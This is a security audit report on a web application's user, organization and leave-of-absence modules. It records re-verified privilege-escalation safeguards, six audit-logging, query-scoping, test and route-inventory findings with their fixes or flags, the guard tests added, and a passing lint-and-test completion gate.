The highest-risk surface in the codebase by design (privilege escalation):
module-audit iteration 21 (three parallel readers) plus four dedicated
app-review passes (2026-08-06 through 2026-08-09) that exist specifically
because this module governs role/permission/rank assignment. Every finding
across both series is closed except ORU-7c (org-wide `member` role
mass-escalation), which is an intentional-but-sharp design flagged for a
product decision, not a defect — unchanged, re-confirmed still accurate in
`KNOWN_LIMITATIONS.md`.

`member_leaves.py` is not in the module-audit's own file list for this
grouping — it was reviewed under a different module-audit entry
(`module-audit/membership-pipeline.md`, iteration 9, MP-3/MP-4 fixed) that
groups it with `membership_pipeline.py`/`member_status.py` instead. Both
findings there are closed; re-verified below rather than re-derived.

**File sizes have grown since the last full pass** (`users.py` 1,774→2,484 L,
`organizations.py` 1,026→1,272 L, `member_status.py` 911→1,046 L,
`member_leaves.py` 251→297 L) — traced to specific, already-fixed,
already-tested commits (the `hire_date` restricted-field fix, a
`scheduling.assign` permission added to leave creation, admin-navigation/PII
redaction) rather than one large undocumented feature. No new feature of the
`SavedBallotTemplate` shape was found in this module.

**Corrected — a Codex review round on the PR caught eight real issues** the
first pass of this file missed, seven of them by checking only part of what
each claim required (auth coverage checked permission-vs-authenticated but
not a third bare-`get_current_user`-with-no-self-check category; the
unbounded-query dismissal checked current headcount but not that accounts
are archived, never deleted; the completion gate's test selector matched 2
of 37 relevant tests; a "table not found" skip was actually a stale table
name; the audit-history allowlist and its query predicate both had real
gaps; a "covered by existing regression test" claim was true of the helper
function but not its call sites). All eight are addressed below — six with
code fixes, two with corrected claims. Full detail in Findings.

**Read in full:** every route decorator and its auth dependency across all
four files (61 routes), corrected below to a third bare-auth category the
first pass mischaracterized. The privilege-ceiling call sites
(`_enforce_role_grant_ceiling`, `_enforce_rank_grant_ceiling`) and their
callers. The PII-redaction call sites. The settings redaction call sites in
`organizations.py`. Every `.scalars().all()` call across the four files, for
dimension 6. The member audit-history query's full predicate
(`users.py:2198-2246`) and the `_AUDIT_EVENT_DESCRIPTIONS` allowlist it
filters through. `member_leaves.py`'s create/update/delete handlers and
`MemberLeaveService`.

**Re-verified by targeted check, not full re-read:** the pre-existing
findings (ORU-1…9, ORU-7a/b/c/d) — each has a re-verification history across
5 passes; this iteration confirmed the mechanisms are still wired at their
documented call sites rather than re-deriving them.

**Not re-read line-by-line:** the full ~5,100 combined lines. Sections with
no signal of change (no new route, no doc drift, no migration) were not
re-read past the auth-coverage and ceiling/redaction spot checks.

## Route inventory

61 routes across the four files, in three categories — corrected from the
original two-category pass:

- **`require_permission`/`require_all_permissions`-gated:** the large
  majority of the 61.
- **Bare `get_current_user`, self-or-admin checked in the handler body:**
  self-service mutations (contact-info, profile, photo) and the
  target-vs-caller comparisons in `member_leaves.py`.
- **Bare `get_current_user`, no self-check — org-wide reads with no
  permission string at all:** `GET /users/contact-info-enabled`, and in
  `organizations.py` — `GET /settings`, `GET /modules`, `GET /profile`. The
  original pass's route inventory claimed no route falls into this third
  category; wrong. Verified this is the same, already-audited pattern
  ORU-8b covers for `/settings` (`without_infrastructure()` strips secrets/
  `it_team` for non-`settings.manage` callers before the bare-auth response
  goes out) — the org derives exclusively from `current_user.organization_id`
  in all three, and none returns another org's data or a secret to a caller
  who merely authenticated. Not a defect; a genuine third category the
  inventory should have named.

## Verified good ✅ (re-confirmed this pass)

- **The privilege-escalation ceilings are still wired at their documented
  call sites.** `_enforce_role_grant_ceiling` (`users.py:677`) is called from
  `create_member` (`:325`) and the add-role paths (`:828`, `:954`).
  `_enforce_rank_grant_ceiling` (`users.py:713`) is called from
  `create_member` (`:253`) and `update_user_profile`'s rank-change branch
  (`:1433`) — closing both ORU-1 and the CRITICAL ORU-7d parallel-escalation
  path. **Corrected:** the original pass cited `test_rank_grant_ceiling.py`
  as covering this; it calls `_enforce_rank_grant_ceiling` directly, not
  through either route, so it cannot detect the call being silently dropped
  from either wiring point — which is exactly how ORU-1 and ORU-7d
  originally happened. A new source-inspection guard test closes that gap
  (see Guard tests).
- **PII redaction gates (ORU-8) still wired on both `with-roles` callers.**
- **Settings secret redaction (ORU-2/3/5) still holds.**
- **`hire_date` restriction (2026-08-16 fix) confirmed present and tested.**
- **No SQL injection; no CSV export in this module.**
- **Schema & migration integrity clean** (see Schema & migration notes).

## Findings

Six fixed, two doc corrections (no code change needed for those two).

### USR-1 — LOW/MED — Leave-of-absence create/update/delete never wrote an audit event — ✅ FIXED

**What:** `_AUDIT_EVENT_DESCRIPTIONS` and `_AUDIT_EVENT_FILTERS` have
declared `leave_of_absence_created`/`_updated`/`_deleted` since the
audit-history feature shipped, but no code anywhere called `log_audit_event`
with any of the three — confirmed by a repo-wide search for the literal
strings. `create_leave_of_absence`/`update_leave_of_absence`/
`delete_leave_of_absence` (`member_leaves.py`) committed straight to the
database with no audit trail.

**Failure scenario:** an officer creates, backdates, or deactivates a
member's leave of absence — which also drives training-waiver eligibility
and shift-assignment cancellation — and nothing records who did it or when.
A member disputing an incorrect leave record, or an audit of officer
activity, finds no entry for any of it.

**Fix:** each handler now calls `log_audit_event` with the declared event
type, `target_user_id` set to the leave's member, and the relevant detail
(dates/type on create, changed field names on update, the leave id on
delete) — matching the shape every other event in the allowlist already
uses, so the audit-history query picks these up with no further change.

### USR-2 — MED — Member audit-history query leaked unrelated members' events into an actor's own history — ✅ FIXED

**What:** the query's final `OR` clause was `AuditLog.user_id ==
user_id_str` with no further condition — "this member was the actor,"
unconditionally. Every other clause matches on a specific target field
(`target_user_id`, `new_user_id`, etc.), so an event where this member acted
**on someone else** was included by the actor clause even though the target
fields correctly identify a different person.

**Where:** `users.py:2198-2246` (`get_member_audit_history`).

**Failure scenario:** a manager views member A's audit history (advertised
as "changes to the member's record"). A previously reset member B's MFA
(`admin_mfa_reset`, `target_user_id=B`). That event now appears in **A's**
history too, because A was the actor — showing the manager an entry that
names B and describes an action on B's account, under a page whose header
says it's A's record.

**Fix:** the actor-fallback clause now additionally requires that none of
the five known target-field keys are populated in `event_data` — i.e. it
only fires for genuinely self-inherent events (no separate target recorded
at all, such as a member editing their own contact info). Any event that
does carry a target is decided solely by the target-match clauses, on their
own merits — narrower than before, never broader.

### USR-3 — LOW — Two real, emitted audit event types were invisible in member history — ✅ FIXED

**What:** `admin_mfa_reset` (`users.py:1820`) and `compliance_exemption_changed`
(`member_status.py:1028`) are both real events, already written with a
`target_user_id` in the same shape every other tracked event uses — but
neither was a key in `_AUDIT_EVENT_DESCRIPTIONS`, so `member_event_types =
list(_AUDIT_EVENT_DESCRIPTIONS.keys())` silently excluded both from the
query's `event_type.in_(...)` filter regardless of the target match.

**Failure scenario:** a manager investigating a member's account cannot see
that their MFA was administratively reset, or that a compliance exemption
was granted or revoked — two of the more security/compliance-relevant
actions this endpoint exists to surface.

**Fix:** added both to `_AUDIT_EVENT_DESCRIPTIONS`.

### USR-4 — LOW — A schema regression test silently skipped instead of verifying anything — ✅ FIXED

**What:** `test_user_roles_junction_has_both_fks` looked up a table named
`user_roles` in the reflected schema. `models/user.py:546` declares
`user_roles = user_positions` — a **Python-level** backward-compatible
alias, not a second database table; the live table is `user_positions`
(`:522`). The lookup always returned `None`, so the test always
`pytest.skip()`'d and never once checked the real junction table's foreign
keys.

**Fix:** look up `user_positions` and assert its FKs target `users` and
`positions` (not `roles` — `Role = Position` is also just an alias). Now
passes for real rather than skipping (verified: reverting the fix reproduces
the skip).

### USR-5 — LOW/MED — Unbounded lists over data that accumulates without deletion — 🚩 FLAGGED (corrected from "no defect")

**What:** the original pass of this section checked `list_users_with_roles`
and `get_archived_members` for the FIN-9/ELEC-12 unbounded-scan shape and
dismissed both, reasoning they're bounded by "real department headcount."
That reasoning is wrong: `archive_member` changes `User.status` without
deleting the row, so archived accounts accumulate for the organization's
entire lifetime, and `list_users_with_roles` filters only `deleted_at`, not
`status` — both grow with **all-time membership**, not current headcount.
The same pass also missed two more instances in this module's own file set:
`leave_widget_summary` (`member_leaves.py:57-69`, every `active` leave, and
end dates don't clear that flag) and `MemberLeaveService.list_leaves`
(`member_leave_service.py:160-177`), which runs `.scalars().all()` before
`member_leaves.py`'s callers apply an in-memory slice.

**Impact:** LOW today for a young/small department, growing over the life of
the organization; all four are `members.manage`-gated (not reachable by an
ordinary member) and org-scoped (not cross-tenant).

**Fix:** not applied — pagination on any of these four is a response-envelope
change needing a decision on default page size and whether existing callers
(the roster page, the leave widget) tolerate a paginated response without a
frontend change, the same category of judgment call FIN-7's export cap and
ELEC-12 were left flagged for. Mirrored into `KNOWN_LIMITATIONS.md`.

**Owner decision (2026-10-05): compute the leave widget's counts in SQL, no
contract change.** `leave_widget_summary` now issues one aggregate
`COUNT`/`SUM(CASE …)` query instead of loading every active leave, with the
same three definitions (`tests/test_leave_widget_summary_counts.py`). The other
three lists — `list_users_with_roles`, `get_archived_members` and
`MemberLeaveService.list_leaves` — stay unbounded: the owner chose this option
over paginating them, which would have changed their response envelopes. That
remainder is accepted, and recorded as such in `KNOWN_LIMITATIONS.md`.

### USR-6 — Doc correction — Route inventory omitted a third bare-auth category

Covered under Route inventory above — not a code defect, a mischaracterization
of the existing (already-audited, ORU-8b-covered) design.

## Schema & migration notes

`users` and `organizations` are part of the initial schema migration — not
`create_all`-only, unlike several modules reviewed earlier in this rotation.
`member_leaves_of_absence` (`member_leaves.py`'s table) has its own dedicated
migration (`20260220_0300_add_member_leaves_of_absence.py`). The one
`ondelete="SET NULL"` FK in `models/user.py` is paired `nullable=True`.

## Guard tests added

- `tests/test_member_leave_audit_events.py` — three tests (create/update/
  delete) asserting the expected `leave_of_absence_*` audit row now exists
  with the correct `target_user_id` (USR-1).
- `tests/test_member_audit_history_scoping.py` — asserts the two new
  allowlist entries are present (USR-3), and a DB-backed test proving a
  manager's own audit-history no longer includes an event they performed on
  a different member, while still including a genuine self-action
  (USR-2) — verified to fail without the fix.
- `tests/test_database_schema.py::test_user_roles_junction_has_both_fks`
  (USR-4) — corrected in place to look up the live table name; verified to
  actually run (not skip) and to still pass against the real schema.
- `tests/test_privilege_ceiling_wiring.py` — two source-inspection tests
  asserting `create_member` calls both ceiling functions and
  `update_user_profile` calls the rank ceiling — cheap, and it fails loudly
  if either call is ever silently dropped (the exact shape of the original
  ORU-1/ORU-7d bugs), closing the coverage gap Codex identified in the
  existing helper-level tests.

## Completion gate

| Check                                                                                                                             | Result                                                                              |
| --------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| `flake8 app/ tests/ alembic/`                                                                                                     | ✅ 0 violations                                                                     |
| `black --check app/ tests/ alembic/`                                                                                              | ✅ clean                                                                            |
| `isort --check-only app/ tests/ alembic/` (8.0.1, CI's pin)                                                                       | ✅ clean                                                                            |
| `validate_migrations.py --strict`                                                                                                 | ✅ 356 revisions, single head                                                       |
| `pytest tests/test_pii_exposure.py`                                                                                               | ✅ 37 passed (full file — corrected from a `-k` selector that matched only 2 of 37) |
| `pytest tests/ -k "user or organization or member_status or member_leave or rank_grant or role_edit or audit_history or ceiling"` | ✅ 320 passed, 1 skipped (unrelated `py_vapid` optional dep)                        |
| `tsc --noEmit`                                                                                                                    | ✅ 0 errors (no frontend file changed)                                              |
| `eslint .`                                                                                                                        | ✅ 0 errors/warnings (no frontend file changed)                                     |
